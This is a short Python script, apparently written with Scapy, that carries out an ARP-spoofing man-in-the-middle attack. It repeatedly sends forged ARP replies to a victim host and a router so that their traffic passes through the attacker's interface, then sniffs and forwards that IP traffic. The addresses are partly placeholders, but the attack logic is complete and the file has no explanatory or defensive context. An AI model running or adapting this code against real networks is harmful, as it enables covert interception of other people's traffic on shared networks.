from scapy.all import ARP, Ether, IP, sr, srp, send, sendp, sniff, get_if_hwaddr
import threading
import time

victim_ip = "10.10.1.x"
router_ip = "10.10.0.x"
victim_mac = [MAC_ADDRESS]
router_mac = [MAC_ADDRESS]    
interface = "wlp0s20f3"

def arp_spoof():
    while True:
        victim_arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
        router_arp = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip)
        send(victim_arp, iface=interface, verbose=False)
        send(router_arp, iface=interface, verbose=False)
        time.sleep(2)

def forward(pkt):
    if IP in pkt:
        ether = pkt.getlayer(Ether)

        if pkt[IP].src == victim_ip:
            ether.src = get_if_hwaddr(interface)
            ether.dst = router_mac
            sendp(pkt, iface=interface, verbose=False)

        elif pkt[IP].src == router_ip:
            ether.src = get_if_hwaddr(interface)
            ether.dst = victim_mac
            sendp(pkt, iface=interface, verbose=False)

spoof_thread = threading.Thread(target=arp_spoof)
spoof_thread.start()



sniff(iface=interface, filter="ip", prn=forward)
